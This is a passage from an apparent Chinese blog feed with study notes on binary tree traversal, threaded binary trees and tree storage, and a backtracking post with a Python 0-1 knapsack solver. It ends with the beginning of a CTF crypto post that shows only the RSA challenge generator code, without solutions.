class="hljs-comment">//然后去访问它的左子树，再进入第6句循环 </span><br>        &#125;<br>      <span class="hljs-keyword">else</span> &#123;  <span class="hljs-comment">//左子树为空，但是栈还不为空</span><br>            <span class="hljs-built_in">Pop</span>(S, q);  <span class="hljs-comment">//将当前栈顶元素弹出</span><br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c&quot;</span>,q-&gt;data);<br>            p = q-&gt;rchild; <span class="hljs-comment">//其实全用p就行了，感觉这里有点小复杂了 </span><br>        &#125;<br>    &#125;<span class="hljs-comment">//while</span><br>    <span class="hljs-keyword">return</span> OK;<br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="二叉树的层次遍历">5.4.5 二叉树的层次遍历</h3><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312060022760.png"alt="二叉树的层次遍历" /><figcaption aria-hidden="true">二叉树的层次遍历</figcaption></figure><p>对于一颗二叉树，从根结点开始，按从上到下、从左到右的顺序访问每一个结点。每一个结点仅仅访问一次</p><p>上图层次遍历结果为：A B C D E F G</p><blockquote><p>这个算法看起来是很简单的，甚至说第一次接触二叉树我想的就是这种遍历算法，一层一层遍历不就行了，但是实现起来其实不是那么简单，或者说让我自己实现我都想不到怎么实现，是有点小巧妙在里面的</p></blockquote><p>算法设计思路：使用一个队列</p><ol type="1"><li>将根结点进队</li><li>队不空时循环：从队列中出列一个结点*p，访问它<ol type="1"><li>若它有左孩子结点，将左孩子结点进队</li><li>若它有右孩子结点，将右孩子结点进队</li></ol></li></ol><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312060025826.png"alt="二叉树的层次遍历算法" /><figcaption aria-hidden="true">二叉树的层次遍历算法</figcaption></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">//使用队列（顺序循环队列）类型定义如下</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span>&#123;<br>    BTNode data[MaxSize]; <span class="hljs-comment">//存放队中元素</span><br><span class="hljs-type">int</span> front, rear; <span class="hljs-comment">//队头和队尾指针</span><br>&#125;SqQueue;   <span class="hljs-comment">//顺序循环队列类型</span><br></code></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">//二叉树层次遍历算法，这里只是类c语言，只提供思路（可能因为用的不太多？后面就不实现了</span><br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">LevelOrder</span><span class="hljs-params">(BTNode *b)</span></span>&#123;<br>    BTNode *p;<br>    SqQueue *qu;<br>    <span class="hljs-built_in">InitQueue</span>(qu);  <span class="hljs-comment">//初始化队列</span><br>    <span class="hljs-built_in">enQueue</span>(qu, b); <span class="hljs-comment">//根结点指针进入队列</span><br>    <span class="hljs-keyword">while</span> (!<span class="hljs-built_in">QueueEmpty</span>(qu))&#123;   <span class="hljs-comment">//队不为空，则循环</span><br>        <span class="hljs-built_in">deQueue</span>(qu, p);  <span class="hljs-comment">//出队结点p</span><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c&quot;</span>, p-&gt;data);<span class="hljs-comment">//访问结点p</span><br>        <span class="hljs-keyword">if</span> (p-&gt;lchild != <span class="hljs-literal">NULL</span>) <span class="hljs-built_in">enQueue</span>(qu, p-&gt;lchild); <span class="hljs-comment">//有左孩子时将其进队</span><br>        <span class="hljs-keyword">if</span> (p-&gt;rchild != <span class="hljs-literal">NULL</span>) <span class="hljs-built_in">enQueue</span>(qu, p-&gt;rchild)<span class="hljs-comment">//有右孩子时将其进队</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>层次遍历也可以用栈实现但比队列麻烦些不细说有兴趣下去了解</p></blockquote><h3 id="二叉树遍历算法的应用">5.4.6 二叉树遍历算法的应用</h3><h4 id="二叉树的建立">5.4.6.1 二叉树的建立</h4><p>按先序遍历序列建立二叉树的二叉链表</p><p>例：已知先序序列为ABCDEGF</p><p>（1）从键盘输入二叉树的结点信息，建立二叉树的存储结构</p><p>（2）在建立二叉树的过程中按照二叉树先序方式建立</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c++"><br><span class="hljs-function">Status <span class="hljs-title">CreateBiTree</span><span class="hljs-params">(BiTree &amp;T)</span></span>&#123;   <span class="hljs-comment">//按先序次序创建二叉树</span><br>    <span class="hljs-built_in">scanf</span>(&amp;ch); <span class="hljs-comment">//cin &gt;&gt; ch;</span><br>    <span class="hljs-keyword">if</span> (ch==<span class="hljs-string">&#x27;#&#x27;</span>) T=<span class="hljs-literal">NULL</span>;  <span class="hljs-comment">// *可用空格或一个特殊字符</span><br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">if</span> (!(T=(BiTNode *)<span class="hljs-built_in">malloc</span>(<span class="hljs-built_in">sizeof</span>(BiTNode))))<br>            <span class="hljs-built_in">exit</span> (OVERFLOW);   <span class="hljs-comment">//c++语法:T=new BiTNode;</span><br>        T-&gt;data=ch;                 <span class="hljs-comment">//生成根结点</span><br>        <span class="hljs-built_in">CreateBiTree</span>(T-&gt;lchild);   <span class="hljs-comment">//构造左子树</span><br>        <span class="hljs-built_in">CreateBiTree</span>(T-&gt;rchild);  <span class="hljs-comment">//构造右子树</span><br>    &#125;<br>    <span class="hljs-keyword">return</span> OK;<br>&#125;     <br>    <br><span class="hljs-comment">//若按中序或后序呢?</span><br><br></code></pre></td></tr></table></figure><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312071553229.png"alt="二叉树的建立" /><figcaption aria-hidden="true">二叉树的建立</figcaption></figure><h4 id="复制二叉树">5.4.6.2 复制二叉树</h4><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312071619419.png"alt="复制二叉树" /><figcaption aria-hidden="true">复制二叉树</figcaption></figure><h4 id="计算二叉树的深度">5.4.6.3 计算二叉树的深度</h4><p>如果是空树，则深度为0</p><p>否则，递归计算左子树的深度记为m，递归计算右子树的深度记为n，二叉树的深度则为m与n的较大者加1。</p><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312071622351.png"alt="计算二叉树的深度" /><figcaption aria-hidden="true">计算二叉树的深度</figcaption></figure><p><del>md全是递归，全是套娃</del></p><h4 id="计算结点总数">5.4.6.4 计算结点总数</h4><p>如果是空树，则结点个数为0</p><p>否则，结点个数为左子树的结点个数+右子树的结点个数再+1.</p><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312071626996.png"alt="计算结点总数" /><figcaption aria-hidden="true">计算结点总数</figcaption></figure><h4 id="计算叶子结点数">5.4.6.5 计算叶子结点数</h4><p>如果是空树，则叶子结点个数为0</p><p>否则，为左子树的叶子结点个数+右子树的叶子结点个数</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">LeadCount</span><span class="hljs-params">(BiTree T)</span></span>&#123;<br>    <span class="hljs-keyword">if</span>(T==<span class="hljs-literal">NULL</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;  <span class="hljs-comment">//如果是空树返回0</span><br>    <span class="hljs-keyword">if</span>(T-&gt;lchild == <span class="hljs-literal">NULL</span> &amp;&amp; T-&gt;rchild == <span class="hljs-literal">NULL</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>; <span class="hljs-comment">//如果是叶子结点返回1</span><br>    <span class="hljs-keyword">else</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">LeafCount</span>(T-&gt;lchild) + <span class="hljs-built_in">LeafCount</span>(T-&gt;rchild);<br>&#125;<br><br></code></pre></td></tr></table></figure><h2 id="线索二叉树">5.5 线索二叉树</h2><p>问题：为什么要研究线索二叉树？</p><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312071633544.png"alt="问题：为什么要研究线索二叉树？" /><figcaptionaria-hidden="true">问题：为什么要研究线索二叉树？</figcaption></figure><p>提出的问题：如何寻找特定遍历序列中二叉树结点的前驱和后继???</p><p>解决的方法</p><p>1、通过遍历寻找——费时间</p><p>2、再增设前驱、后继指针域——增加了存储负担</p><p>3、利用二叉链表中的空指针域（※）</p><p>回顾：二叉链表中的空指针域的数量：具有n个结点的二叉链表中，有n+1个空指针域</p><p>那么能不能把这n+1个空指针域利用起来呢？答案是肯定的</p><p>利用二叉链表中的空指针域</p><ul><li>如果某个结点的左孩子为空，则将空的左孩子指针域改为指向其前驱</li><li>如果某结点的右孩子为空，则将空的右孩子指针域改为指向其后继</li><li>这种改变指向的指针称为“线索“</li></ul><p>加上了线索的二叉树称为<strong>线索二叉树 (Threaded BinaryTree)</strong></p><p>对二叉树按某种遍历次序使其变为线索二叉树的过程叫线索化</p><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312071650949.png"alt="中序线索二叉树例子" /><figcaption aria-hidden="true">中序线索二叉树例子</figcaption></figure><p>为区分<code>Irchid</code>和<code>rchild</code>指针到底是指向孩子的指针，还是指向前驱或者后继的指针，对二叉链表中每个结点增设两个标志域<code>ltag</code> 和 <code>rtag</code> ，并约定如下：</p><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312071655554.png"alt="线索二叉树结点结构" /><figcaption aria-hidden="true">线索二叉树结点结构</figcaption></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">BiThrNode</span> &#123;<br>    <span class="hljs-type">int</span> data;<br>    <span class="hljs-type">int</span> LTag,RTag; <span class="hljs-comment">//左右标志</span><br>    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">BiThrNode</span> *lchild, *rchild;  <span class="hljs-comment">//左右孩子指针</span><br>                                      <br>&#125;BiThrNode, *BiThrTree;<br></code></pre></td></tr></table></figure><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312071658884.png"alt="线序线索二叉树" /><figcaption aria-hidden="true">线序线索二叉树</figcaption></figure><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312071701982.png"alt="后序线索二叉树" /><figcaption aria-hidden="true">后序线索二叉树</figcaption></figure><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312071705688.png"alt="中序线索二叉树" /><figcaption aria-hidden="true">中序线索二叉树</figcaption></figure><p>为了避免悬空状态，增设一个头结点，让操作更加方便</p><p>增设了一个头结点<code>thrt</code>：</p><p><code>ltag=0</code>，<code>lchild</code>指向根结点</p><p><code>rtag=1</code>，<code>rchild</code>指向遍历序列中最后一个结点</p><p>遍历序列中第一个结点的<code>lc</code>域和最后一个结点的<code>rc</code>域都指向头结点</p><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312071708028.png"alt="中序线索二叉树" /><figcaption aria-hidden="true">中序线索二叉树</figcaption></figure><h2 id="树和森林">5.6 树和森林</h2><p>由二叉树推而广之，研究一下树和森林</p><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312071711195.png"alt="树和森林" /><figcaption aria-hidden="true">树和森林</figcaption></figure><h3 id="树的存储结构">5.6.1 树的存储结构</h3><p>1、双亲表示法：</p><p>用一个数组连续存储结点,各结点中附设一个指示其双亲的结点位置(下标).</p><blockquote><p>参考：</p><p><ahref="https://blog.csdn.net/Real_Fool_/article/details/113930623">数据结构：树(Tree)【详解】_数据结构树_UniqueUnit的博客-CSDN博客</a></p></blockquote>]]></content>
    
    
    <categories>
      
      <category>数据结构</category>
      
    </categories>
    
    
    <tags>
      
      <tag>数据结构</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>算法 6 回溯法</title>
    <link href="/2023/12/03/%E7%AE%97%E6%B3%95%206-%E5%9B%9E%E6%BA%AF%E6%B3%95/"/>
    <url>/2023/12/03/%E7%AE%97%E6%B3%95%206-%E5%9B%9E%E6%BA%AF%E6%B3%95/</url>
    
    <content type="html"><![CDATA[<p>1</p><h2 id="方法概述">方法概述</h2><h3 id="搜索算法介绍">搜索算法介绍</h3><ol type="1"><li><p>穷举搜索</p></li><li><p>盲目搜索</p></li></ol><ul><li>深度优先( DFS ) 或 回溯搜索 (Backtracking)；</li><li>广度优先搜索(BFS)；</li><li>分支限界法(Branch &amp; Bound)</li><li>博奔树搜索 (α-β Search)</li></ul><ol start="3" type="1"><li>启发式搜索</li></ol><ul><li><p>A* 算法和最佳优先(Best-First Search)</p></li><li><p>迭代加深的A* 算法</p></li><li><p>B* ，AO* ，SSS*等算法</p></li><li><p>Local Search，GA等算法</p></li></ul><h3 id="搜索空间的三种表示">搜索空间的三种表示</h3><p>表序表示：搜索对象用线性表数据结构表示</p><p>显示图表示：搜索对象在搜索前就用图(树)的数据结构表示</p><p>隐式图表示：除了初始结点，其他结点在搜索过程中动态生成。缘于搜索空间大，难以全部存储。</p><h3 id="回溯法backtracking">回溯法(Backtracking)</h3><p>回溯法(Backtracking)又称为试探法：</p><ul><li>回溯法是一个既带有系统性又带有跳跃性的搜索算法；</li><li>它在包含问题的所有解的解空间树中，按照深度优先的策略，从根结点出发搜索解空间树。——系统性</li><li>算法搜索至解空间树的任一结点时，判断该结点为根的子树是否包含问题的解，如果肯定不包含，则跳过以该结点为根的子树的搜索逐层向其祖先结点回溯。否则，进入该子树，继续深度优先的策略进行搜索。——跳跃性</li><li><strong>这种以深度优先的方式系统地搜索问题的解的算法称为回溯法</strong>。它适用于解一些组合数较大的问题。许多复杂的、规模较大的问题都可以使用回溯法，有“通用解题方法”的美称。</li><li>递归(Recursion)、迭代(lteration)、回溯??区别与联系</li></ul><h4 id="基本思想">基本思想</h4><p>（上面的概念也是属于基本思想的）</p><ul><li>搜索从开始结点(根结点) 出发，以深度优先搜索整个解空间。</li><li>这个开始结点成为活结点，同时也成为当前的扩展结点。在当前的扩展结点处，搜索向纵深方向移至一个新结点。这个新结点就成为新的活结点，并成为当前扩展结点。</li><li>如果在当前的扩展结点处不能再向纵深方向扩展，则当前扩展结点就成为死结点。</li><li>此时，应往回移动(回溯)至最近的一个活结点处(回溯点)，并使这个活结点成为当前的扩展结点;直到找到一个解或全部解。</li></ul><h4 id="基本步骤">基本步骤：</h4><ol type="1"><li>针对所给问题，定义问题的解空间；</li><li>确定易于搜索的解空间结构；</li><li>以深度优先方式搜索解空间，并在搜索过程中用前枝函数避免无效搜索。</li></ol><p><strong>常用剪枝函数：</strong></p><p>① 用约束函数在扩展结点处剪去不满足约束的子树；</p><p>② 用限界函数剪去得不到最优解的子树。</p><h3 id="二类常见的解空间树">二类常见的解空间树：</h3><h4 id="子集树">子集树</h4><p>当所给的问题是从n个元素的集合S中找出满足某种性质的子集时，相应的解空间树称为子集树。子集树通常有<spanclass="math inline">\(2^n\)</span>个叶子结点，其总结点个数为<spanclass="math inline">\(2^{n+1}-1\)</span>，遍历子集树时间为<spanclass="math inline">\(Ω(2^n)\)</span>。如0-1背包问题，叶结点数为<spanclass="math inline">\(2^n\)</span>，总结点数<spanclass="math inline">\(2^{n+1}\)</span>。</p><p>假设现在有一列数 <span class="math inline">\(a[0],a[1],...a[n-1]\)</span>，如果一个问题的解的长度不是固定的，并且解和元素顺序无关，即可以从中选择0个或多个，那么解空间的个数将是指数级别的，为<spanclass="math inline">\(2^n\)</span>,可以用下面的子集树来表示所有的解(假设这里n=4)</p><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312032047861.png"alt="子集树" /><figcaption aria-hidden="true">子集树</figcaption></figure><p>这里一共有<span class="math inline">\(2^4=16\)</span>种情况</p><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312032051625.png"alt="0-1背包问题（1）" /><figcaption aria-hidden="true">0-1背包问题（1）</figcaption></figure><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312032051520.png"alt="0-1背包问题（2）" /><figcaption aria-hidden="true">0-1背包问题（2）</figcaption></figure><h4 id="排列树">排列树</h4><p>当所给问题是确定n个元素满足某种性质的排列时，相应的解空间树称为排列树。排列树通常有<spanclass="math inline">\(n!\)</span>个叶子结点，因此，遍历排列树需要<spanclass="math inline">\(Ω(n!)\)</span>的计算时间。如TSP问题(TravelingSalesman Problem，推销员问题)，叶结点数为<spanclass="math inline">\(n!\)</span>，遍历时间为<spanclass="math inline">\(Ω(n!)\)</span>。</p><p>如果解空间是由n个元素的排列形成，即n个元素的每一个排列都是解空间中的一个元素，那么，最后解空间的组织形式是排列树。</p><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312032048478.png"alt="排列树" /><figcaption aria-hidden="true">排列树</figcaption></figure><p>这里每一个元素有<spanclass="math inline">\(3*2*1=6\)</span>种情况，一共就有<spanclass="math inline">\(4*6=24\)</span>种情况，也就是<spanclass="math inline">\(4*3*2*1=24\)</span></p><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312032053917.png"alt="TSP问题" /><figcaption aria-hidden="true">TSP问题</figcaption></figure><p>因为这里规定了从A出发，所以一共就有<spanclass="math inline">\(3*2*1=6\)</span>种情况</p><h2 id="背包问题">0-1背包问题</h2><h3 id="问题描述">问题描述</h3><p>给定n种物品和一背包。物品i的重量是<spanclass="math inline">\(w_i&gt;0\)</span>，其价值为<spanclass="math inline">\(v_i&gt;0\)</span>，背包的容量为c。问应如何选择装入背包中的物品，使得装入背包中物品的总价值最大？</p><p>如：</p><p><img src="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312031926719.png" alt="0-1背包问题例题" style="zoom:80%;" /></p><p>肉眼可算出答案是[1,3,4]，结果是20</p><h3 id="复杂度分析">复杂度分析</h3><p><strong>时间复杂度分析：</strong></p><p>回溯法的时间复杂度通常随着问题规模的增加而指数级增长。在每一步，算法需要考虑选择或不选择当前物品，因此复杂度为<span class="math inline">\(O(2^n)\)</span>，其中 n是物品的数量。这是因为对于每个物品，都有两种选择：选择或不选择。因此，总共有<span class="math inline">\(2^n\)</span> 种组合需要考虑。</p><p><strong>空间复杂度分析：</strong></p><p>空间复杂度主要取决于递归调用的深度。在回溯法中，递归调用堆栈的深度是问题的规模。因为在每一步中都有两个分支（选择或不选择），递归树的深度是n，其中 n 是物品的数量。因此，空间复杂度为 <spanclass="math inline">\(O(n)\)</span>。</p><p>需要注意的是，这里的空间复杂度并不考虑输入数据的空间占用，仅仅是算法本身的空间占用。</p><p>需要注意的是，虽然回溯法的时间复杂度很高，但在实际应用中，可以通过一些优化策略（例如剪枝）来减少搜索空间，提高算法效率。对于0-1背包问题，通常更推荐使用动态规划来获得更高效的解决方案。</p><h3 id="代码">代码</h3><p><strong>python：</strong></p><p>要我说，这玩意真要好好调试一下吧，不然🐭🐭是真理解不了啊</p><p>这真有人第一次能自己写出来吗，我怎么不信呢😭😭😭</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># python</span><br>max_V, now_W, now_V, best_X, goods = <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, [], []  <span class="hljs-comment"># 最大价值、当前重量、当前价值、最优解、商品列表</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;请输入物品数量、背包容量，空格隔开：&#x27;</span>)<br>n, c = <span class="hljs-built_in">map</span>(<span class="hljs-built_in">int</span>, <span class="hljs-built_in">input</span>().split())<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(n):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;请输入第<span class="hljs-subst">&#123;i + <span class="hljs-number">1</span>&#125;</span>个物品的重量和价值，空格隔开：&#x27;</span>)<br>    goods.append(<span class="hljs-built_in">list</span>(<span class="hljs-built_in">map</span>(<span class="hljs-built_in">int</span>, <span class="hljs-built_in">input</span>().split())))<br>x = [<span class="hljs-number">0</span> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(n)]  <span class="hljs-comment"># 初始化当前解</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">backtrack</span>(<span class="hljs-params">i</span>):  <span class="hljs-comment"># i是层数，n个物品，共有n+1层</span><br>    <span class="hljs-keyword">global</span> max_V, now_V, now_W, best_X, x  <span class="hljs-comment"># 引入全局变量</span><br>    <span class="hljs-keyword">if</span> i &gt;= n:  <span class="hljs-comment"># 当层数超过物品总数量的时候</span><br>        <span class="hljs-keyword">if</span> max_V &lt; now_V:  <span class="hljs-comment"># 当最大值小于当前价值时，更新最大值</span><br>            max_V = now_V<br>            best_X = x[:]  <span class="hljs-comment"># 同步更新最优解</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">if</span> now_W + goods[i][<span class="hljs-number">0</span>] &lt;= c:  <span class="hljs-comment"># 如果当前重量加上该层对应物品的重量，可以装在背包里</span><br>            x[i] = <span class="hljs-number">1</span>  <span class="hljs-comment"># 那么就装入这个物品（当前物品的状态为1）</span><br>            now_W += goods[i][<span class="hljs-number">0</span>]  <span class="hljs-comment"># 更新当前重量和价值</span><br>            now_V += goods[i][<span class="hljs-number">1</span>]<br>            backtrack(i + <span class="hljs-number">1</span>)  <span class="hljs-comment"># 进入下一个节点（如果符合条件就到底了）</span><br>            now_W -= goods[i][<span class="hljs-number">0</span>]  <span class="hljs-comment"># 另一侧节点</span><br>            now_V -= goods[i][<span class="hljs-number">1</span>]<br>        x[i] = <span class="hljs-number">0</span>  <span class="hljs-comment"># 初始化物品状态</span><br>        backtrack(i + <span class="hljs-number">1</span>)  <span class="hljs-comment"># 进入下一层</span><br><br><br>backtrack(<span class="hljs-number">0</span>)  <span class="hljs-comment"># 从第0层开始搜索</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;最大价值为：<span class="hljs-subst">&#123;max_V&#125;</span>&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;应装物品编号为：<span class="hljs-subst">&#123;[i + <span class="hljs-number">1</span> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(n) <span class="hljs-keyword">if</span> best_X[i]]&#125;</span>&#x27;</span>)<br><br></code></pre></td></tr></table></figure><p><a href="https://www.cnblogs.com/xym4869/p/8513801.html">0-1背包问题—— 四种解法解题 - Shaw_喆宇 - 博客园 (cnblogs.com)</a></p>]]></content>
    
    
    <categories>
      
      <category>算法分析与设计</category>
      
    </categories>
    
    
    <tags>
      
      <tag>回溯法</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Crypto系列——RSA（四）</title>
    <link href="/2023/12/02/Crypto%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94RSA%EF%BC%88%E5%9B%9B%EF%BC%89/"/>
    <url>/2023/12/02/Crypto%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94RSA%EF%BC%88%E5%9B%9B%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h2 id="rsa4p1">[RSA4]P1</h2><h3 id="main">main</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br>flag = <span class="hljs-string">b&#x27;NSSCTF&#123;******&#125;&#x27;</span><br><br>p = getPrime(<span class="hljs-number">512</span>)<br>q = getPrime(<span class="hljs-number">512</span>)<br>n = p*p*q<br>e = n<br><br>c = <span class="hljs-built_in">pow</span>(bytes_to_long(flag), e, n)<br>d = inverse(e, (p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>))<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;n = <span class="hljs-subst">&#123;n&#125;</span>&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;d = <span class="hljs-subst">&#123;d&#125;</span>&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;c = <span class="hljs-subst">&#123;c&#125;</span>&#x27;</span>)<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">n = 539403894871945779827202174061302970341082455928364137444962844359039924160163196863639732747261316352083923762760392277536591121706270680734175544093484423564223679628430671167864783270170316881238613070741410367403388936640139281272357761773388084534717028640788227350254140821128908338938211038299089224967666902522698905762169859839320277939509727532793553875254243396522340305880944219886874086251872580220405893975158782585205038779055706441633392356197489</span><br><span class="hljs-string">d = 58169755386408729394668831947856757060407423126014928705447058468355548861569452522734305188388017764321018770435192767746145932739423507387500606563617116764196418533748380893094448060562081543927295828007016873588530479985728135015510171217414380395169021607415979109815455365309760152218352878885075237009</span><br><span class="hljs-string">c = 192900246089028524753714085947506209686933390275949638288635203069117504901164350538204619142802436833736532680210208373707687461486601253665313637541968852691434282584934523173439632554783111037594035333325446559685553119339191110056283203940511701992217372405369575376549738295022767068810511670144120539082403063406787770958515441813335548550876818218065412869322721395317537328975187612606437225577060414403223288106406471061759010085578263501971809720648827</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><h3 id="exp">*exp</h3><h2 id="rsa4p2">[RSA4]P2</h2><h3 id="main-1">main</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br>flag = <span class="hljs-string">b&#x27;NSSCTF&#123;******&#125;&#x27;</span><br><br>m = bytes_to_long(flag)<br><br>a = getPrime(<span class="hljs-number">512</span>)<br>b = getPrime(<span class="hljs-number">512</span>)<br>c = getPrime(<span class="hljs-number">512</span>)<br>d = getPrime(<span class="hljs-number">512</span>)<br>x = getPrime(<span class="hljs-number">128</span>)<br><br>p = getPrime(<span class="hljs-number">1024</span>)<br><br>y = a*x**<span class="hljs-number">3</span> + b*x**<span class="hljs-number">2</span> + c*x + d<br>y = y%p<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;p = <span class="hljs-subst">&#123;p&#125;</span>&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;a = <span class="hljs-subst">&#123;a&#125;</span>&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;b = <span 